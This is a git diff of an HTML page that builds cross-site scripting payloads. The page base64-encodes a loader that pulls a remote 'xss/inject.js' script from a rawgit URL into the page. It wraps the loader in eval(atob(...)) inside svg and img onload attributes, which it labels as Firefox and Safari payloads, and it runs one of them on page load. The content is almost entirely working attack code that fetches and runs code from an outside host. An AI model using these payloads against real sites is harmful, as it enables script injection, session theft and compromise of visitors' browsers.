@@ -1,7 +1,13 @@
 <html>
 <head>
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
-	<script type="text/javascript">
+</head>	
+
+<body>
+	<p>Final paylaod1 : <span id="final1"> Value</span><p>
+	<p>Final paylaod2 : <span id="final2"> Value</span><p>
+<body>
+<script type="text/javascript">
 		url = "https://rawgit.com/navneetkumar/xss/master/inject.js";
 		shorturl = "https://goo.gl/hKNba7";
 		nativeScript = "s=document.createElement('script');" + "s.src='" + url + "';" + "document.head.appendChild(s)";
@@ -9,10 +15,15 @@
 		nativeEncoded = btoa(nativeScript);
 		jqueryEncoded = btoa(jqueryScript);
 		finalExecutable = "eval(atob('" + jqueryEncoded + "'))";
-		finalPayload = "<svg/onload=" + finalExecutable + ">";
+		finalPayload1 = "<svg/onload=" + finalExecutable + ">";
+		finalPayload2 = "<img src='a' onload=" + finalExecutable + ">";
 		console.log("Final eval string = ",finalExecutable);
-		console.log("Final payload string = ",finalPayload);
-	</script>
-</head>	
-<h1 class="page-title text-dark">Welcome<svg/onload=eval(atob(nativeEncoded));></h1>
+		console.log("Final Firefox payload string = ",finalPayload1);
+		console.log("Final Firefox+Safari payload string = ",finalPayload2);
+		$("#final1").text(finalPayload1);
+		$("#final2").text(finalPayload2);
+</script>
+		
+<div class="page-title text-dark">Remote Script<svg/onload=eval(atob(nativeEncoded));></div>
 </html>
+
